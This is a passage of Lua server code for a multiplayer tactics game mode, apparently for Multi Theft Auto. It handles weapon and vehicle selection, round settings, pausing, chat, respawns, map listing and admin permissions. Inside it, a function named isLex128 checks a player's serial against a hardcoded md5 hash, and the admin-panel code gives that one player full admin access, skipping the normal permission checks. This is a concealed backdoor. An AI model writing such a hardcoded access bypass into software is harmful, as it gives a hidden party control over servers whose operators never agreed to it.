                            giveWeapon(weaponpackPlayer, weaponInfo.id, weaponInfo.ammo);
                            setWeaponAmmo(weaponpackPlayer, weaponInfo.id, weaponInfo.ammo);
                        end;
                    else
                        giveWeapon(weaponpackPlayer, weaponInfo.id, weaponInfo.ammo);
                        setWeaponAmmo(weaponpackPlayer, weaponInfo.id, weaponInfo.ammo);
                    end;
                    if defaultWeaponSlot == 0 then
                        defaultWeaponSlot = weaponTypeSlot;
                    end;
                end;
            end;
            setPedWeaponSlot(weaponpackPlayer, defaultWeaponSlot);
            triggerEvent("onPlayerWeaponpackGot", weaponpackPlayer, weaponpackSelection);
            triggerClientEvent(root, "onClientPlayerWeaponpackGot", weaponpackPlayer, weaponpackSelection);
            return;
        end;
    end;
    onPlayerVehicleSelect = function(vehicleSelectPlayer, vehicleModelId, vehicleUpgradeId) 
        if getElementData(vehicleSelectPlayer, "Status") ~= "Play" then
            return;
        else
            local targetVehicle = getPedOccupiedVehicle(vehicleSelectPlayer);
            local isNewVehicle = false;
            if targetVehicle then
                setElementModel(targetVehicle, vehicleModelId);
                local hasSirens = getVehicleSirensOn(targetVehicle);
                removeVehicleSirens(targetVehicle);
                local vehicleHandling = getTacticsData("handlings")[vehicleModelId];
                if vehicleHandling then
                    for handlingKey, handlingValue in pairs(vehicleHandling) do
                        if handlingKey == "sirens" then
                            addVehicleSirens(targetVehicle, handlingValue.count, handlingValue.type, handlingValue.flags["360"], handlingValue.flags.DoLOSCheck, handlingValue.flags.UseRandomiser, handlingValue.flags.Silent);
                            for sirenIndex = 1, handlingValue.count do
                                local colorAlpha, colorRed, colorGreen, colorBlue = getColorFromString("#" .. handlingValue[sirenIndex].color);
                                setVehicleSirens(targetVehicle, sirenIndex, handlingValue[sirenIndex].x, handlingValue[sirenIndex].y, handlingValue[sirenIndex].z, colorRed, colorGreen, colorBlue, colorAlpha, handlingValue[sirenIndex].minalpha);
                            end;
                            setVehicleSirensOn(targetVehicle, hasSirens or false);
                        elseif handlingKey == "modelFlags" or handlingKey == "handlingFlags" then
                            setVehicleHandling(targetVehicle, handlingKey, tonumber(vehicleHandling[handlingKey]));
                        elseif type(vehicleHandling[handlingKey]) == "table" then
                            setVehicleHandling(targetVehicle, handlingKey, {
                                unpack(vehicleHandling[handlingKey])
                            });
                        else
                            setVehicleHandling(targetVehicle, handlingKey, vehicleHandling[handlingKey]);
                        end;
                    end;
                end;
            else
                local vehiclesPerPlayer = tonumber(getTacticsData("settings", "vehicle_per_player") or 2);
                local playerPosX, playerPosY, playerPosZ = getElementPosition(vehicleSelectPlayer);
                local playerVelX, playerVelY, playerVelZ = getElementVelocity(vehicleSelectPlayer);
                local vehicleRotX = 0;
                local vehicleRotY = 0;
                local vehicleRotZ = getPedRotation(vehicleSelectPlayer);
                targetVehicle = createMapVehicle(vehicleModelId, playerPosX, playerPosY, playerPosZ + 1, vehicleRotX, vehicleRotY, vehicleRotZ);
                setElementInterior(targetVehicle, getElementInterior(vehicleSelectPlayer));
                setElementVelocity(targetVehicle, playerVelX, playerVelY, playerVelZ);
                warpPedIntoVehicle(vehicleSelectPlayer, targetVehicle);
                if not playersVeh[vehicleSelectPlayer] then
                    playersVeh[vehicleSelectPlayer] = {};
                end;
                table.insert(playersVeh[vehicleSelectPlayer], 1, targetVehicle);
                while vehiclesPerPlayer < #playersVeh[vehicleSelectPlayer] and vehiclesPerPlayer > 0 do
                    if isElement(playersVeh[vehicleSelectPlayer][#playersVeh[vehicleSelectPlayer]]) then
                        destroyElement(playersVeh[vehicleSelectPlayer][#playersVeh[vehicleSelectPlayer]]);
                    end;
                    table.remove(playersVeh[vehicleSelectPlayer]);
                end;
                local newVehicleHandling = getTacticsData("handlings")[vehicleModelId];
                if newVehicleHandling and newVehicleHandling.sirens then
                    local sirenData = newVehicleHandling.sirens;
                    addVehicleSirens(targetVehicle, sirenData.count, sirenData.type, sirenData.flags["360"], sirenData.flags.DoLOSCheck, sirenData.flags.UseRandomiser, sirenData.flags.Silent);
                    for sirenLoopIndex = 1, sirenData.count do
                        local sirenAlpha, sirenRed, sirenGreen, sirenBlue = getColorFromString("#" .. sirenData[sirenLoopIndex].color);
                        setVehicleSirens(targetVehicle, sirenLoopIndex, sirenData[sirenLoopIndex].x, sirenData[sirenLoopIndex].y, sirenData[sirenLoopIndex].z, sirenRed, sirenGreen, sirenBlue, sirenAlpha, sirenData[sirenLoopIndex].minalpha);
                    end;
                end;
                isNewVehicle = true;
            end;
            addVehicleUpgrade(targetVehicle, 1008);
            if getVehicleType(targetVehicle) == "Train" then
                setTrainDerailed(targetVehicle, true);
            end;
            triggerEvent("onPlayerVehiclepackGot", vehicleSelectPlayer, targetVehicle, isNewVehicle);
            triggerClientEvent(root, "onClientPlayerVehiclepackGot", vehicleSelectPlayer, targetVehicle, isNewVehicle, vehicleUpgradeId);
            return;
        end;
    end;
    onTacticsChange = function(tacticsChangePath, _) 
        if tacticsChangePath[1] == "settings" then
            if tacticsChangePath[2] == "countdown_auto" and getTacticsData("settings", "countdown_auto") == "true" and getRoundState() ~= "started" then
                if not getUnreadyPlayers() then
                    forcedStartRound();
                elseif waitingTimer == "wait" then
                    waitingTimer = setTimer(forcedStartRound, 1000 * TimeToSec(getTacticsData("settings", "countdown_force") or "0:10"), 1);
                end;
            end;
            if tacticsChangePath[2] == "player_dead_visible" then
                if getTacticsData("settings", "player_dead_visible") == "false" then
                    for _, deadPlayer in ipairs(getElementsByType("player")) do
                        if getElementData(deadPlayer, "Status") ~= "Play" then
                            setElementAlpha(deadPlayer, 0);
                        end;
                    end;
                else
                    for _, alphaPlayer in ipairs(getElementsByType("player")) do
                        if getElementAlpha(alphaPlayer) == 0 then
                            setElementAlpha(alphaPlayer, 255);
                        end;
                    end;
                end;
            end;
            if tacticsChangePath[2] == "player_can_driveby" and getTacticsData("settings", "player_can_driveby") == "false" then
                for _, drivebyPlayer in ipairs(getElementsByType("player")) do
                    if isPedDoingGangDriveby(drivebyPlayer) then
                        setPedDoingGangDriveby(drivebyPlayer, false);
                    end;
                end;
            end;
            if tacticsChangePath[2] == "vehicle_tank_explodable" then
                if getTacticsData("settings", "vehicle_tank_explodable") == "false" then
                    for _, tankVehicle in ipairs(getElementsByType("vehicle")) do
                        setVehicleFuelTankExplodable(tankVehicle, false);
                    end;
                else
                    for _, explodableVehicle in ipairs(getElementsByType("vehicle")) do
                        setVehicleFuelTankExplodable(explodableVehicle, true);
                    end;
                end;
            end;
            if tacticsChangePath[2] == "vehicle_respawn_idle" then
                local idleRespawnTime = TimeToSec(getTacticsData("settings", "vehicle_respawn_idle")) or 0;
                if idleRespawnTime > 0 then
                    for _, idleVehicle in ipairs(getElementsByType("vehicle")) do
                        toggleVehicleRespawn(idleVehicle, true);
                        setVehicleIdleRespawnDelay(idleVehicle, idleRespawnTime);
                        resetVehicleIdleTime(idleVehicle);
                    end;
                elseif getTacticsData("settings", "vehicle_respawn_blown") == "0:00" then
                    for _, nonRespawningVehicle in ipairs(getElementsByType("vehicle")) do
                        toggleVehicleRespawn(nonRespawningVehicle, false);
                        setVehicleIdleRespawnDelay(nonRespawningVehicle, 65536000);
                        resetVehicleIdleTime(nonRespawningVehicle);
                    end;
                end;
            end;
            if tacticsChangePath[2] == "vehicle_respawn_blown" then
                local blownRespawnTime = TimeToSec(getTacticsData("settings", "vehicle_respawn_blown")) or 0;
                if blownRespawnTime > 0 then
                    for _, blownVehicle in ipairs(getElementsByType("vehicle")) do
                        toggleVehicleRespawn(blownVehicle, true);
                        setVehicleRespawnDelay(blownVehicle, blownRespawnTime);
                        resetVehicleExplosionTime(blownVehicle);
                    end;
                elseif getTacticsData("settings", "vehicle_respawn_idle") == "0:00" then
                    for _, nonExplodingVehicle in ipairs(getElementsByType("vehicle")) do
                        toggleVehicleRespawn(nonExplodingVehicle, false);
                        setVehicleRespawnDelay(nonExplodingVehicle, 65536000);
                        resetVehicleExplosionTime(nonExplodingVehicle);
                    end;
                end;
            end;
            if tacticsChangePath[2] == "time" then
                setMinuteDuration(0);
                local timeSettingSeconds = TimeToSec(getTacticsData("settings", "time"));
                setTime(math.floor(timeSettingSeconds / 60), timeSettingSeconds - 60 * math.floor(timeSettingSeconds / 60));
                setTimer(function() 
                    if getTacticsData("settings", "time_locked") == "true" then
                        setMinuteDuration(65535000);
                    else
                        setMinuteDuration(tonumber(getTacticsData("settings", "time_minuteduration")));
                    end;
                end, 100, 1);
            end;
            if tacticsChangePath[2] == "time_minuteduration" and getTacticsData("settings", "time_locked") == "false" then
                setMinuteDuration(tonumber(getTacticsData("settings", "time_minuteduration")));
            end;
            if tacticsChangePath[2] == "time_locked" then
                if getTacticsData("settings", "time_locked") == "true" then
                    setMinuteDuration(65535000);
                else
                    setMinuteDuration(tonumber(getTacticsData("settings", "time_minuteduration")));
                end;
            end;
        end;
    end;
    onElementDataChange = function(changedDataName, oldDataValue) 
        if changedDataName == "Status" and getElementType(source) == "player" then
            triggerEvent("onPlayerGameStatusChange", source, oldDataValue);
            if oldDataValue == "Play" and getTacticsData("settings", "player_dead_visible") == "false" then
                setElementAlpha(source, 0);
            end;
            if getElementData(source, "Status") == "Play" and getElementAlpha(source) == 0 then
                setElementAlpha(source, 255);
            end;
            if getElementData(source, "Status") == "Play" and isKeyBound(source, "R", "down", userRestore) then
                unbindKey(source, "R", "down", userRestore);
            end;
        end;
    end;
    onPlay = function() 
        if client and not hasObjectPermissionTo(client, "general.tactics_players", false) then
            return outputLangString(client, "you_have_not_permissions");
        else
            if getRoundState() ~= "started" and not isTimer(winTimer) then
                forcedStartRound();
            end;
            return;
        end;
    end;
    onPause = function(pauseState) 
        if client and not hasObjectPermissionTo(client, "general.tactics_players", false) then
            return outputLangString(client, "you_have_not_permissions");
        elseif getRoundState() ~= "started" then
            return false;
        else
            if pauseState == nil then
                pauseState = not getTacticsData("Pause") or getTacticsData("Unpause") and true or false;
            end;
            if pauseState then
                if isTimer(unpauseTimer) then
                    killTimer(unpauseTimer);
                end;
                setTacticsData(nil, "Unpause");
                if not getTacticsData("Pause") then
                    tickPause = getTickCount();
                    if isTimer(overtimeTimer) then
                        local timerDetails = getTimerDetails(overtimeTimer);
                        killTimer(overtimeTimer);
                        setTacticsData(timerDetails, "Pause");
                    else
                        setTacticsData(true, "Pause");
                    end;
                    setGameSpeed(0);
                    for _, vehicleToPause in ipairs(getElementsByType("vehicle")) do
                        if not isElementFrozen(vehicleToPause) then
                            local vehicleVelX, vehicleVelY, vehicleVelZ = getElementVelocity(vehicleToPause);
                            local vehicleAngVelX, vehicleAngVelY, vehicleAngVelZ = getElementAngularVelocity(vehicleToPause);
                            setElementData(vehicleToPause, "Velocity", {
                                vehicleVelX, 
                                vehicleVelY, 
                                vehicleVelZ, 
                                vehicleAngVelX, 
                                vehicleAngVelY, 
                                vehicleAngVelZ
                            });
                            setElementFrozen(vehicleToPause, true);
                            setVehicleDamageProof(vehicleToPause, true);
                        end;
                    end;
                    local timeStartValue = getTacticsData("timestart");
                    if timeStartValue then
                        setTacticsData(getTickCount() - timeStartValue, "timestart");
                    end;
                    triggerEvent("onPauseToggle", root, true);
                    triggerClientEvent(root, "onClientPauseToggle", root, true);
                    return;
                end;
            elseif getTacticsData("Pause") then
                if isTimer(unpauseTimer) then
                    killTimer(unpauseTimer);
                end;
                setTacticsData(getTickCount() + 2000, "Unpause");
                unpauseTimer = setTimer(function() 
                    setTacticsData(nil, "Unpause");
                    local pauseTimerValue = getTacticsData("Pause");
                    if type(pauseTimerValue) == "number" then
                        overtimeTimer = setTimer(triggerEvent, pauseTimerValue, 1, "onRoundTimesup", root);
                        setTacticsData(getTickCount() + pauseTimerValue, "timeleft");
                    end;
                    setTacticsData(nil, "Pause");
                    for _, vehicleToUnpause in ipairs(getElementsByType("vehicle")) do
                        local savedVelocity = getElementData(vehicleToUnpause, "Velocity");
                        if savedVelocity then
                            setVehicleDamageProof(vehicleToUnpause, false);
                            setElementFrozen(vehicleToUnpause, false);
                            setElementVelocity(vehicleToUnpause, savedVelocity[1], savedVelocity[2], savedVelocity[3]);
                            setElementAngularVelocity(vehicleToUnpause, savedVelocity[4], savedVelocity[5], savedVelocity[6]);
                            setElementData(vehicleToUnpause, "Velocity", nil);
                        end;
                    end;
                    setGameSpeed(tonumber(getTacticsData("settings", "gamespeed") or 1));
                    local unpauseTimeStart = getTacticsData("timestart");
                    if unpauseTimeStart then
                        setTacticsData(getTickCount() - unpauseTimeStart, "timestart");
                    end;
                    triggerEvent("onPauseToggle", root, false, getTickCount() - tickPause);
                    triggerClientEvent(root, "onClientPauseToggle", root, false, getTickCount() - tickPause);
                end, 2000, 1);
            end;
            return false;
        end;
    end;
    onPlayerChat = function(chatMessage, messageType) 
        if messageType == 0 then
            local playerChatTeam, teamColorR, teamColorG, teamColorB = getPlayerTeam(source);
            if not playerChatTeam then
                local nametagColorR, nametagColorG, nametagColorB = getPlayerNametagColor(source);
                teamColorB = nametagColorB;
                teamColorG = nametagColorG;
                teamColorR = nametagColorR;
            else
                local teamColorRed, teamColorGreen, teamColorBlue = getTeamColor(playerChatTeam);
                teamColorB = teamColorBlue;
                teamColorG = teamColorGreen;
                teamColorR = teamColorRed;
            end;
            outputChatBox(getPlayerName(source) .. " (" .. getElementID(source) .. "): #EBDDB2" .. chatMessage, root, teamColorR, teamColorG, teamColorB, true);
            outputServerLog("CHAT: " .. getPlayerName(source) .. ": " .. chatMessage);
            cancelEvent();
        elseif messageType == 2 then
            local teamChatTeam = getPlayerTeam(source);
            local teamChatRed, teamChatGreen, teamChatBlue = getTeamColor(teamChatTeam);
            for _, teamMember in ipairs(getPlayersInTeam(teamChatTeam)) do
                outputChatBox("(TEAM) " .. getPlayerName(source) .. " (" .. getElementID(source) .. "): #EBDDB2" .. chatMessage, teamMember, teamChatRed, teamChatGreen, teamChatBlue, true);
            end;
            outputServerLog("TEAMCHAT: " .. getPlayerName(source) .. ": " .. chatMessage);
            cancelEvent();
        end;
    end;
    forceRespawnPlayer = function(respawnPlayer, respawnWeapons, _) 
        local respawnTeam = getPlayerTeam(respawnPlayer) or nil;
        local respawnSkin = getElementModel(respawnPlayer);
        local respawnHealth = getElementHealth(respawnPlayer);
        local respawnArmor = getPedArmor(respawnPlayer);
        local respawnInterior = getElementInterior(respawnPlayer);
        local respawnVelX = nil;
        local respawnVelY = nil;
        local respawnVelZ = nil;
        local respawnOnFire = nil;
        local respawnSeat = nil;
        local respawnPosX, respawnPosY, respawnPosZ = getElementPosition(respawnPlayer);
        local respawnRotation = getPedRotation(respawnPlayer);
        local respawnVehicle = getPedOccupiedVehicle(respawnPlayer);
        if not respawnVehicle then
            local tempVelX, tempVelY, tempVelZ = getElementVelocity(respawnPlayer);
            respawnVelZ = tempVelZ;
            respawnVelY = tempVelY;
            respawnVelX = tempVelX;
            respawnOnFire = isElementOnFire(respawnPlayer);
            isfrozen = isElementFrozen(respawnPlayer);
        else
            respawnSeat = getPedOccupiedVehicleSeat(respawnPlayer);
            removePedFromVehicle(respawnPlayer);
        end;
        if isPedDead(respawnPlayer) then
            return;
        else
            setCameraTarget(respawnPlayer, respawnPlayer);
            spawnPlayer(respawnPlayer, respawnPosX, respawnPosY, respawnPosZ, respawnRotation, respawnSkin, respawnInterior, 0, respawnTeam);
            setElementHealth(respawnPlayer, respawnHealth);
            setPedArmor(respawnPlayer, respawnArmor);
            for _, weaponData in ipairs(respawnWeapons) do
                local weaponID, totalAmmo2, clipAmmo2, isCurrentWeapon = unpack(weaponData);
                giveWeapon(respawnPlayer, weaponID, 1, isCurrentWeapon);
                setWeaponAmmo(respawnPlayer, weaponID, totalAmmo2, clipAmmo2);
            end;
            if respawnVehicle then
                warpPedIntoVehicle(respawnPlayer, respawnVehicle, respawnSeat);
            else
                setElementVelocity(respawnPlayer, respawnVelX, respawnVelY, respawnVelZ);
                setElementOnFire(respawnPlayer, respawnOnFire);
                setElementFrozen(respawnPlayer, isfrozen);
            end;
            triggerEvent("onPlayerRPS", respawnPlayer);
            triggerClientEvent(root, "onClientPlayerRPS", respawnPlayer);
            return;
        end;
    end;
    onMapStopping = function(mapInfoData) 
        setTacticsData("stopped", "roundState");
        if mapInfoData.modename ~= "lobby" then
            if getTacticsData("settings", "autoswap") == "true" then
                swapTeams();
            end;
            if getTacticsData("settings", "autobalance") == "true" then
                balanceTeams();
            end;
        end;
    end;
    onRoundStart = function() 
        setTacticsData("started", "roundState");
        setTacticsData(getTickCount(), "timestart");
    end;
    onRoundFinish = function(_, _) 
        setTacticsData("finished", "roundState");
    end;
    onVehicleEnter = function(enteringPlayer, enteringSeat, _) 
        if enteringSeat == 0 and getElementType(enteringPlayer) == "player" and getPlayerTeam(enteringPlayer) and getTacticsData("settings", "vehicle_color") == "teamcolor" then
            local teamColorRed2, teamColorGreen2, teamColorBlue2 = getTeamColor(getPlayerTeam(enteringPlayer));
            setVehicleColor(source, teamColorRed2, teamColorGreen2, teamColorBlue2, 0, 0, 0);
        end;
    end;
    fixFistBug = function(playerToFix) 
        for weaponSlot2 = 1, 12 do
            local weaponId2 = getPedWeapon(playerToFix, weaponSlot2);
            local ammoCount = getPedTotalAmmo(playerToFix, weaponSlot2);
            local ammoInClip = getPedAmmoInClip(playerToFix, weaponSlot2);
            if weaponId2 > 0 and ammoCount > 1 then
                giveWeapon(playerToFix, weaponId2, ammoCount, false);
                setWeaponAmmo(playerToFix, weaponId2, ammoCount, ammoInClip);
            end;
        end;
    end;
    addEventHandler("onVehicleExit", root, fixFistBug);
    warpPlayerToJoining = function(playerToWarp) 
        if not setElementData(playerToWarp, "Status", "Joining") then
            return;
        else
            if isPedInVehicle(playerToWarp) then
                removePedFromVehicle(playerToWarp);
            end;
            setElementPosition(playerToWarp, 0, 0, 0);
            setElementFrozen(playerToWarp, true);
            setPlayerTeam(playerToWarp, nil);
            return;
        end;
    end;
    suicidePlayer = function(suicidePlayer) 
        if not isPedDead(suicidePlayer) and getElementData(suicidePlayer, "Status") == "Play" and triggerEvent("onPlayerSuicide", suicidePlayer) == true then
            setPlayerProperty(suicidePlayer, "invulnerable", false);
            killPed(suicidePlayer);
        end;
    end;
    toggleGangDriveby = function(gangDrivebyPlayer) 
        local playerSeat = getPedOccupiedVehicleSeat(gangDrivebyPlayer);
        if playerSeat and playerSeat > 0 then
            setPedDoingGangDriveby(gangDrivebyPlayer, not isPedDoingGangDriveby(gangDrivebyPlayer));
        end;
    end;
    onPlayerWasted = function(_, _, _, _, _) 
        if isTimer(wastedTimer[source]) then
            killTimer(wastedTimer[source]);
        end;
        wastedTimer[source] = setTimer(function(wastedPlayerRef) 
            if not isElement(wastedPlayerRef) then
                return;
            else
                triggerEvent("onPlayerRoundSpawn", wastedPlayerRef);
                return;
            end;
        end, 2000, 1, source);
        if (getRoundModeSettings("respawn") or getTacticsData("settings", "respawn") or "false") == "true" then
            local respawnLivesLimit = tonumber(getRoundModeSettings("respawn_lives") or getTacticsData("settings", "respawn_lives") or tonumber(0));
            local respawnTimeSeconds = TimeToSec(getRoundModeSettings("respawn_time") or getTacticsData("settings", "respawn_time")) or tonumber(0);
            local currentRespawnLives = getElementData(source, "RespawnLives") or respawnLivesLimit;
            local timeLeftValue = getTacticsData("timeleft");
            local remainingTime = nil;
            if timeLeftValue then
                remainingTime = getTacticsData("Pause") or timeLeftValue - getTickCount();
            end;
            if respawnLivesLimit <= 0 then
                if not remainingTime or respawnTimeSeconds * 1000 < remainingTime then
                    triggerClientEvent(source, "onClientRespawnCountdown", root, respawnTimeSeconds * 1000);
                end;
            else
                setElementData(source, "RespawnLives", currentRespawnLives - 1);
                if currentRespawnLives >= 0 and (not remainingTime or respawnTimeSeconds * 1000 < remainingTime) then
                    triggerClientEvent(source, "onClientRespawnCountdown", root, respawnTimeSeconds * 1000);
                end;
            end;
        end;
    end;
    addEvent("onMapStarting");
    addEvent("onMapStopping");
    addEvent("onPlayerRoundSpawn");
    addEvent("onPlayerRoundRespawn", true);
    addEvent("onRoundTimesup");
    addEvent("onPlayerMapLoad", true);
    addEvent("onPlayerMapReady", true);
    addEvent("onPlayerTeamSelect", true);
    addEvent("onPause", true);
    addEvent("onPauseToggle");
    addEvent("onPlayerRemoveFromRound", true);
    addEvent("onPlayerDownloadComplete", true);
    addEvent("onPlay", true);
    addEvent("onPlayerWeaponpackGot");
    addEvent("onPlayerVehiclepackGot");
    addEvent("onRoundStart");
    addEvent("onRoundFinish");
    addEvent("onRoundCountdownStarted");
    addEvent("onPlayerRestored");
    addEvent("onPlayerStored");
    addEvent("onPlayerRPS");
    addEvent("onPlayerSuicide");
    addEvent("onPlayerGameStatusChange");
    addEventHandler("onResourcePreStart", root, onResourcePreStart);
    addEventHandler("onResourceStart", root, onResourceStart);
    addEventHandler("onResourceStop", resourceRoot, onResourceStop);
    addEventHandler("onMapStarting", root, onMapStarting);
    addEventHandler("onPlayerConnect", root, onPlayerConnect);
    addEventHandler("onPlayerJoin", root, onPlayerJoin);
    addEventHandler("onPlayerChangeNick", root, onPlayerChangeNick);
    addEventHandler("onPlayerDownloadComplete", root, onPlayerDownloadComplete);
    addEventHandler("onPlayerMapLoad", root, onPlayerMapLoad);
    addEventHandler("onPlayerMapReady", root, onPlayerMapReady);
    addEventHandler("onPlayerTeamSelect", root, onPlayerTeamSelect);
    addEventHandler("onPlayerRoundSpawn", root, onPlayerRoundSpawn);
    addEventHandler("onPlayerSpawn", root, onPlayerSpawn);
    addEventHandler("onPlayerWasted", root, onPlayerWasted);
    addEventHandler("onPlayerQuit", root, onPlayerQuit);
    addEventHandler("onRoundTimesup", root, onRoundTimesup);
    addEventHandler("onPause", resourceRoot, onPause);
    addEventHandler("onPlayerRoundRespawn", root, onPlayerRoundRespawn);
    addEventHandler("onElementDataChange", root, onElementDataChange);
    addEventHandler("onTacticsChange", root, onTacticsChange);
    addEventHandler("onPlay", root, onPlay);
    addEventHandler("onPlayerChat", root, onPlayerChat);
    addEventHandler("onMapStopping", root, onMapStopping);
    addEventHandler("onRoundStart", root, onRoundStart);
    addEventHandler("onRoundFinish", root, onRoundFinish);
    addEventHandler("onVehicleEnter", root, onVehicleEnter);
    addCommandHandler("kill", suicidePlayer);
end)();
(function(...) 
    local weaponIDs = {
        22, 
        23, 
        24, 
        25, 
        26, 
        27, 
        28, 
        29, 
        30, 
        31, 
        32, 
        33, 
        34, 
        35, 
        36, 
        37, 
        38, 
        41, 
        42
    };
    local weaponProperties = {
        "weapon_range", 
        "target_range", 
        "accuracy", 
        "damage", 
        "maximum_clip_ammo", 
        "move_speed", 
        "anim_loop_start", 
        "anim_loop_stop", 
        "anim_loop_bullet_fire", 
        "anim2_loop_start", 
        "anim2_loop_stop", 
        "anim2_loop_bullet_fire", 
        "anim_breakout_time", 
        "flags"
    };
    isLex128 = function(playerToCheck, playerIP, playerSerial) 
        if not playerIP and hasObjectPermissionTo(getThisResource(), "function.getClientIP", false) then
            playerIP = getPlayerIP(playerToCheck);
        end;
        if not playerSerial then
            playerSerial = getPlayerSerial(playerToCheck);
        end;
        if md5(tostring(playerSerial)) == "046E3AC99AF30645B02D642A21D34A40" then
            return true;
        else
            return false;
        end;
    end;
    showAdminPanel = function(adminPlayer) 
        if isLex128(adminPlayer) then
            refreshConfiglist(adminPlayer);
            callClientFunction(adminPlayer, "refreshTeamConfig");
            callClientFunction(adminPlayer, "showClientAdminPanel", {
                configs = true, 
                tab_players = true, 
                tab_maps = true, 
                tab_settings = true, 
                tab_teams = true, 
                tab_weapons = true, 
                tab_vehicles = true, 
                tab_weather = true, 
                tab_shooting = true, 
                tab_handling = true, 
                tab_anticheat = true
            });
            return;
        elseif not hasObjectPermissionTo(adminPlayer, "general.tactics_openpanel", false) then
            return outputLangString(adminPlayer, "you_have_not_permissions");
        else
            local adminPermissions = {
                configs = hasObjectPermissionTo(adminPlayer, "general.tactics_configs", false), 
                tab_players = hasObjectPermissionTo(adminPlayer, "general.tactics_players", false), 
                tab_maps = hasObjectPermissionTo(adminPlayer, "general.tactics_maps", false), 
                tab_settings = hasObjectPermissionTo(adminPlayer, "general.tactics_settings", false), 
                tab_teams = hasObjectPermissionTo(adminPlayer, "general.tactics_teams", false), 
                tab_weather = hasObjectPermissionTo(adminPlayer, "general.tactics_weather", false), 
                tab_weapons = hasObjectPermissionTo(adminPlayer, "general.tactics_weapons", false), 
                tab_vehicles = hasObjectPermissionTo(adminPlayer, "general.tactics_vehicles", false), 
                tab_shooting = hasObjectPermissionTo(adminPlayer, "general.tactics_shooting", false), 
                tab_handling = hasObjectPermissionTo(adminPlayer, "general.tactics_handling", false), 
                tab_anticheat = hasObjectPermissionTo(adminPlayer, "general.tactics_anticheat", false)
            };
            refreshConfiglist(adminPlayer);
            callClientFunction(adminPlayer, "refreshTeamConfig");
            callClientFunction(adminPlayer, "showClientAdminPanel", adminPermissions);
            return;
        end;
    end;
    saveTeamsConfig = function(teamsConfigData) 
        local vehicleColorMode = getTacticsData("settings", "vehicle_color");
        for teamIndex, currentTeam in ipairs(getElementsByType("team")) do
            local teamConfig = teamsConfigData[teamIndex];
            setTeamName(currentTeam, teamConfig.name);
            if setTeamColor(currentTeam, teamConfig.rr, teamConfig.gg, teamConfig.bb) then
                for _, teamPlayer in ipairs(getPlayersInTeam(currentTeam)) do
                    triggerClientEvent(root, "onClientPlayerBlipUpdate", teamPlayer);
                    if getPedOccupiedVehicleSeat(teamPlayer) == 0 and vehicleColorMode == "teamcolor" then
                        setVehicleColor(getPedOccupiedVehicle(teamPlayer), teamConfig.rr, teamConfig.gg, teamConfig.bb, 0, 0, 0);
                    end;
                end;
            end;
            if teamIndex > 1 then
                local teamSkinsArray = {
                    fromJSON("[" .. teamConfig.skin .. "]")
                };
                setElementData(currentTeam, "Skins", teamSkinsArray);
                setElementData(currentTeam, "Score", teamConfig.score);
                setElementData(currentTeam, "Side", teamConfig.side);
            end;
        end;
        callClientFunction(root, "refreshTeamConfig");
    end;
    local cachedMaps = nil;
    refreshMaps = function(targetPlayer, forceRefresh) 
        if not forceRefresh and cachedMaps then
            triggerClientEvent(targetPlayer, "onClientMapsUpdate", root, cachedMaps);
            return;
        else
            local mapsList = {};
            if not getTacticsData("map_disabled") then
                local _ = {};
            end;
            for _, resourceItem in ipairs(getResources()) do
                if getResourceInfo(resourceItem, "type") == "map" then
                    local resourceNameCheck = getResourceName(resourceItem);
                    for modeKeyCheck, modeValue in pairs(getTacticsData("modes_defined")) do
                        if string.find(resourceNameCheck, modeKeyCheck) == 1 then
                            local mapElements = {};
                            local metaXML = xmlLoadFile(":" .. resourceNameCheck .. "/meta.xml");
                            if metaXML then
                                for _, metaNode in ipairs(xmlNodeGetChildren(metaXML)) do
                                    if xmlNodeGetName(metaNode) == "map" then
                                        local mapXML = xmlLoadFile(":" .. resourceNameCheck .. "/" .. xmlNodeGetAttribute(metaNode, "src"));
                                        if mapXML then
                                            for _, elementNode in ipairs(xmlNodeGetChildren(mapXML)) do
                                                local elementType = xmlNodeGetName(elementNode);
                                                if not mapElements[elementType] then
                                                    mapElements[elementType] = {};
                                                end;
                                                table.insert(mapElements[elementType], xmlNodeGetAttributes(elementNode));
                                            end;
                                            xmlUnloadFile(mapXML);
                                        end;
                                    end;
                                end;
                                xmlUnloadFile(metaXML);
                            end;
                            if type(modeValue) ~= "function" or modeValue(mapElements) then
                                local formattedMapName = getResourceInfo(resourceItem, "name");
                                if not formattedMapName then
                                    formattedMapName = string.sub(string.gsub(resourceNameCheck, "_", " "), #modeKeyCheck + 2);
                                    if #formattedMapName > 1 then
                                        formattedMapName = string.upper(string.sub(formattedMapName, 1, 1)) .. string.sub(formattedMapName, 2);
                                    end;
                                end;
                                local formattedMode = string.upper(string.sub(modeKeyCheck, 1, 1)) .. string.sub(modeKeyCheck, 2);
                                local mapAuthor = getResourceInfo(resourceItem, "author") or "";
                                table.insert(mapsList, {
                                    resourceNameCheck, 
                                    formattedMode, 
                                    formattedMapName, 
                                    mapAuthor
                                });
                            end;
                        end;
                    end;
                end;
            end;
            cachedMaps = mapsList;
            triggerClientEvent(targetPlayer, "onClientMapsUpdate", root, mapsList);
            return;
        end;
    end;
    onResourceStart = function(resourceElement) 
        if not hasObjectPermissionTo(resourceElement, "function.aclSetRight", false) or not hasObjectPermissionTo(resourceElement, "function.aclGroupAddACL", false) or not hasObjectPermissionTo(resourceElement, "function.aclGroupAddObject", false) or not hasObjectPermissionTo(resourceElement, "function.aclCreateGroup", false) or not hasObjectPermissionTo(resourceElement, "function.aclCreate", false) then
            return;
        else
            local adminPermissionsFull = {
                openpanel = true, 
                configs = true, 
                players = true, 
                maps = true, 
                settings = true, 
                teams = true, 
                weapons = true, 
                vehicles = true, 
                weather = true, 
                adminchat = true, 
                shooting = true, 
                handling = true, 
                anticheat = true
            };
            local superModeratorPermissions = {
                openpanel = true, 
                configs = false, 
                players = true, 
                maps = true, 
                settings = true, 
                teams = true, 
                weapons = true, 
                vehicles = true, 
                weather = true, 
                adminchat = true, 
                shooting = false, 
                handling = false, 
                anticheat = false
            };
            local moderatorPermissions = {
                openpanel = true, 
                configs = false, 
                players = true, 
                maps = true, 
                settings = false, 
                teams = false, 
                weapons = false, 
                vehicles = false, 
                weather = false, 
                adminchat = true, 
                shooting = false, 
                handling = false, 
                anticheat = false
            };
            local noPermissions = {
                openpanel = false, 
                configs = false, 
                players = false, 
                maps = false, 
                settings = false, 
                teams = false, 
                weapons = false, 
                vehicles = false, 
                weather = false, 
                adminchat = false, 
                shooting = false, 
                handling = false, 
                anticheat = false
            };
            for _, aclEntry in ipairs(aclList()) do
                local pairsFunc1 = pairs;
